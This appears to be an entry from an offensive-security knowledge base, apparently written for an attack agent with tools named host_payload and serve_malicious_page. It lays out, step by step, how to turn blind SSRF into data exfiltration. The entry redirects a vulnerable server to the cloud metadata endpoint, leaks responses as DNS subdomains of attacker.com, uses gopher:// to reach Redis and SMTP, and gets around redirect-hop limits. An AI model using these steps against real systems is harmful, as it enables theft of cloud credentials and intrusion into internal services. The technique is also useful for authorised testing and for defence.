title: Blind SSRF to Exfiltration via Redirect Chains

technique.summary: Convert blind SSRF (where response body is not returned) into visible data exfiltration by chaining redirects through an attacker-controlled server. The attacker server redirects the vulnerable server to internal targets, then captures the response via DNS subdomain encoding or redirect-back techniques.
steps: Confirm blind SSRF exists: request attacker-controlled callback server, observe incoming request but no response returned to attacker
Set up attacker redirect server: host a service that responds with 302/307 redirects to internal targets
Chain redirect to internal target: SSRF → attacker server → 302 to http://169.254.169.254/latest/meta-data/
Use 307/308 redirects to preserve HTTP method (POST body forwarded through redirect chain)
For data exfiltration: redirect back to attacker server with internal response encoded in URL path/query
DNS exfiltration fallback: encode extracted data as subdomain — http://<extracted-data>.attacker.com
Chained pagination: walk internal directory listings by iterating redirect targets

payloads.notes: Attacker server returns 302 Location: http://169.254.169.254/latest/meta-data/ — use host_payload/serve_malicious_page to set up redirect server
307 redirect preserves POST method and body through the chain
Redirect server encodes captured response as DNS subdomain query to attacker DNS server
Redirect to gopher:// scheme for non-HTTP internal service access (Redis, SMTP, etc.)

bypassTechniques: Minimize redirect hop count: some implementations limit redirect depth (commonly 5-10 hops)
Use 307/308 instead of 301/302 to preserve HTTP method across redirects
DNS subdomain exfiltration fallback: encode data in subdomain when response body is not forwarded
Redirect to gopher:// in redirect chain: if server follows scheme changes, access non-HTTP services
Use host_payload or serve_malicious_page tools to host the redirect chain server
Fragment-based exfiltration: encode data in URL fragment if server logs include fragments
Split large responses across multiple DNS queries using chunked subdomain encoding
